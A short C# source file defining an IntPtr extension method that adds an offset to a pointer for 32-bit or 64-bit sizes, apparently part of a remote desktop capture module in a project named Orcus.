using System;

namespace Orcus.Commands.RemoteDesktop.Capture.DesktopDuplication;

public static class IntPtrExtensions
{
	public static IntPtr Add(this IntPtr pointer, int offset)
	{
		int size = IntPtr.Size;
		if (size == 4)
		{
			return new IntPtr(pointer.ToInt32() + offset);
		}
		return new IntPtr(pointer.ToInt64() + offset);
	}
}
